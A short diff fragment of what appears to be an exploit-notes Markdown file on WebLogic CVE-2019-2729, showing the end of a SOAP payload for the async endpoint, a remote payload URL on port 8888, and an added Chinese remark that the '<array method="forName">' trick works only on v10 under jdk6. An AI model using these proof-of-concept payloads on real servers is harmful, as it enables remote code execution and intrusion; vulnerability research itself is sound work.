@@ -16,7 +16,8 @@ http://cqq.com:8888/spel2.xml
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
 ```
 
-### CVE-2019-2729_v10_v12
+### CVE-2019-2729_v10
+由于jdk的原因，`<array method="forName">`仅支持基于jdk6的v10.
 
 poc:
 ```xml
